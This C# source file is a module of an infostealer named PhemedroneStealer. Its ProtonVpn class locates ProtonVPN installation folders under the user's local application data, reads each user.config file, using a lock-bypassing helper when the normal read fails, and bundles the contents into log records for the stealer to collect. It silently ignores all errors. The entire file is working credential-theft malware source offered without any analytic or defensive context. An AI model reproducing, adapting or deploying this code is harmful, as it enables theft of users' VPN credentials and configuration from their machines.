using System;
using System.Collections.Generic;
using System.IO;
using Phemedrone;
using Phemedrone.Classes;
using Phemedrone.Extensions;

namespace PhemedroneStealer.Services.VPN;

public class ProtonVpn : IService
{
    public override PriorityLevel Priority => PriorityLevel.Medium;
    protected override string GetServiceName() => "ProtonVPN";

    protected override LogRecord[] Collect()
    {
        var array = new List<LogRecord>();
        var vpn = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "ProtonVPN");

        if (!Directory.Exists(vpn)) return array.ToArray();
        
        try
        {
            foreach (var dir in Directory.GetDirectories(vpn))
            {
                if (!dir.Contains("ProtonVPN_")) continue;
                
                foreach (var version in Directory.GetDirectories(dir))
                {
                    var file = Path.Combine(version, "user.config");
                    
                    if (!File.Exists(file)) continue;
                    
                    var content = NullableValue.Call(() => File.ReadAllBytes(file));
                    if (content == null)
                    {
                        content = LockHelper.ReadFile(file);
                    
                        if (content == null) continue;
                    }

                    array.Add(new LogRecord
                    {
                        Path = "VPN/ProtonVPN/" + file.Replace(vpn + "\\", null),
                        Content = content
                    });
                }
            }
        }
        catch
        {
            // ignored
        }

        return array.ToArray();
    }
}